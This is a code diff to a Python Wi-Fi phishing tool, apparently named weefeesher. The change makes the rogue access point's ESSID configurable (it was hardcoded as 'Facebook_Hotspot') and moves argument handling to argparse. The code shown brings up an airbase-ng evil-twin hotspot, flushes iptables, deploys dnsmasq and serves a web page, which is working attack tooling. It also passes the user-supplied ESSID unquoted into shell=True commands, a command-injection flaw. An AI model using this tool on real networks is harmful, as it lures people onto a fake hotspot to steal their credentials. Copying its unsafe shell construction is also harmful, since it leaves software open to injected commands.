@@ -2,9 +2,10 @@
 
 import subprocess
 import datetime
-import sys
-import time
+import argparse
 import signal
+import time
+import sys
 import os
 
 from weefeesher.utils.output import Logger
@@ -100,7 +101,7 @@ def signal_handler(signal, frame):
     Logger.info('Bye !')
     sys.exit(0)
 
-def launch_ap(iface):
+def launch_ap(iface, essid):
     Logger.info('Shutting down phishing interface %s' % iface)
     subprocess.call('ip link set %s down' % iface, shell=True)
     subprocess.call('ip link set %s down' % iface, shell=True)
@@ -112,27 +113,38 @@ def launch_ap(iface):
     subprocess.call('ip link set %s up' % iface, shell=True)
     subprocess.call('ip link set %s up' % iface, shell=True)
     Logger.info('Launching rogue access point...')
-    subprocess.Popen('airbase-ng --essid "Facebook_Hotspot" -I 60 %s &> /dev/null' % iface, shell=True)
+    subprocess.Popen('airbase-ng --essid %s -I 60 %s &> /dev/null' % (essid, iface), shell=True)
     time.sleep(2)
     subprocess.call('ip addr add 192.168.10.1/24 dev at0', shell=True)
 
 
 def main():
+    parser = argparse.ArgumentParser(description="Tassin : Sysdream reporting tool")
+    parser.add_argument(
+        "-e", "--essid",
+        help="The hotspot ESSID",
+        default='Hotspot'
+    )
+    parser.add_argument(
+        "-i", "--interface",
+        help="The wireless interface to use",
+        metavar='INTERFACE'
+    )
+
+    args = parser.parse_args()
+
     check_requirements()
-    if len(sys.argv) < 3:
-        print 'Usage : %s <phishing interface> <internet interface>' % sys.argv[0]
-        sys.exit(0)
     global phishing_iface
-    phishing_iface = sys.argv[1]
-    global internet_iface
-    internet_iface = sys.argv[2]
+    phishing_iface = args.interface
+    global essid
+    essid = args.essid
     signal.signal(signal.SIGINT, signal_handler)
     save_iptables()
     flush_iptables()
     global dns
     dns = Dnsmasq()
     dns.backup()
-    launch_ap(phishing_iface)
+    launch_ap(phishing_iface, essid)
     dns.deploy()
     web = Web()
     web.run()
